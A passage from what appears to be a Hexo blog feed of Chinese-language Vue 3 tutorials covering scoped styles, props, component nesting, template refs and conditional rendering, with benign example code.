<h3 id="2-scoped"><a href="#2-scoped" class="headerlink" title="(2)scoped"></a>(2)scoped</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- scoped:让当前样式只在当前组件中生效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.container</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十八【Vue组件传递数据_Props】</title>
    <url>/cnblogs.github.io/p/56d4.html</url>
    <content><![CDATA[<p><strong>组件传递数据_Props</strong><br>组件与组件之间不是完全独立的，而是有交集的，那就是组件与组件之间是可以传递数据的，传递数据的解决方案就是props</p>
<p>我们新增2个vue文件Parent.vue和Child.vue，把Child绑定到Parent里，传递方法如下：</p>
<ul>
<li>Parent.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span> <span class="keyword">from</span> <span class="string">&#x27;./Child.vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Parent<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Child</span> <span class="attr">title</span>=<span class="string">&quot;Parent数据&quot;</span> <span class="attr">demo</span>=<span class="string">&quot;测试&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Child.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;            </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">props</span>:[<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;demo&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Child<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; demo &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>动态传递数据</p>
<ul>
<li>Parent.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Child</span> <span class="keyword">from</span> <span class="string">&#x27;./Child.vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;Parent数据&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Child</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Parent<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Child</span> <span class="attr">:title</span>=<span class="string">&quot;message&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意事项：</strong><br>props传递数据：只能从父级传递到子级，不能反其道而行</p>
<p><strong>组件传递多种数据类型</strong><br>通过props传递数据，不仅可以传递字符串类型的数据，还可以是其他类型，例如：数字、对象、数组等。但实际上任何类型的值都可以作为props的值被传递</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十六【Vue组件嵌套关系】</title>
    <url>/cnblogs.github.io/p/8311.html</url>
    <content><![CDATA[<p><strong>组件嵌套关系</strong><br>组件允许我们将 UI划分为独立的、可重用的部分，并且可以对每个部分进行单独的思考。在实际应用中，组件常常被组织成层层嵌套的树状结构。这和我们嵌套 HTML 元素的方式类似，Vue 实现了自己的组件模型，使我们可以在每个组件内封装自定义内容与逻辑。</p>
<h3 id="（1）创建组件及引用关系"><a href="#（1）创建组件及引用关系" class="headerlink" title="（1）创建组件及引用关系"></a>（1）创建组件及引用关系</h3><p>创建新项目后，我们删掉src&#x2F;components下的所有文件。并且删除App.vue里的内容。方便我们干净的创建组件和引用关系。<br>我们在src文件夹下创建个pages文件夹。并创建以下文件：</p>
<ul>
<li>Header.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="comment">/* 需要删掉自带的 main.js里的import &#x27;./assets/main.css&#x27; */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">h3</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>:<span class="number">5px</span> solid <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>App.vue里引入Header</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Header</span> <span class="keyword">from</span> <span class="string">&quot;./pages/Header.vue&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Header</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们继续写其他的：（记得在App.vue里自行引入）</p>
<ul>
<li>Main.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.main</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">70%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Aside.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;aside&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Aside<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.aside</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">30%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Articke</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Article<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">h3</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-top</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>引用要注意：</strong><br>最上面我们可以看到，Articke是在Main里的，所以我们要在Main里引用这个组件，而不是App.vue</p>
<ul>
<li>Main.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">Articke</span> <span class="keyword">from</span> <span class="string">&#x27;./Articke.vue&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">   <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">       <span class="title class_">Articke</span></span></span><br><span class="line"><span class="language-javascript">   &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">&lt;!-- 因为是2个，所以我们显示2个 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Articke</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Articke</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们接着写下个组件Item，同样在Aside里要引用三个</p>
<ul>
<li>Item.vue</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Item<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">h3</span>&#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">80%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#999</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结十四【Vue模板引用】</title>
    <url>/cnblogs.github.io/p/725b.html</url>
    <content><![CDATA[<p><strong>模板引用</strong><br>虽然 Vue 的声明性渲染模型为你抽象了大部分对 DOM 的直接操作，但在某些情况下，我们仍然需要直接访问底层 DOM 元素。要实现这一点，我们可以使用特殊的 ref attribute挂载结束后引用都会被暴露在 this.$refs之上</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">* 内容改变：&#123;&#123; 模板语法 &#125;&#125;</span></span><br><span class="line"><span class="comment">* 属性改变：v-bind:指令</span></span><br><span class="line"><span class="comment">* 事件：v-on:click</span></span><br><span class="line"><span class="comment">* 如果没有特别的需求，不要操作DOM</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">content</span>: <span class="string">&#x27;内容&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">getElementHandle</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//innerHTML：原生的JS属性</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">container</span>.<span class="property">innerHTML</span>=<span class="string">&#x27;哈哈哈&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">username</span>.<span class="property">value</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;container&quot;</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span>&#123;&#123; content &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;getElementHandle&quot;</span>&gt;</span>获取元素<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结四【Vue模板语法-条件渲染】</title>
    <url>/cnblogs.github.io/p/b674.html</url>
    <content><![CDATA[<p><strong>v-if</strong><br>v-if指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">flag</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>你能看到我吗？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>v-else</strong><br>你也可以使用 v-else 为 v-if 添加一个else 区块</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">flag</span>: <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>你能看到我吗？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>那你还是看看我吧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>v-else-if</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">type</span>: <span class="string">&#x27;D&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">&quot;type===&#x27;A&#x27;&quot;</span>&gt;</span>A<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type===&#x27;B&#x27;&quot;</span>&gt;</span>B<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">&quot;type===&#x27;C&#x27;&quot;</span>&gt;</span>C<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span>Not A/B/C<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>v-show</strong><br>另一个可以用来按条件显示一个元素的指令是 v-show。其用法基本一样</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">flag</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>条件渲染<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-show</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>你能看到我吗？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3核心API【watch】</title>
    <url>/cnblogs.github.io/p/7636.html</url>
    <content><![CDATA[<p>在 Vue3 的响应式系统中，watch 是监听数据变化的核心 API 之一。随着 Composition API 的普及，开发者需要更清晰地理解副作用管理机制。</p>
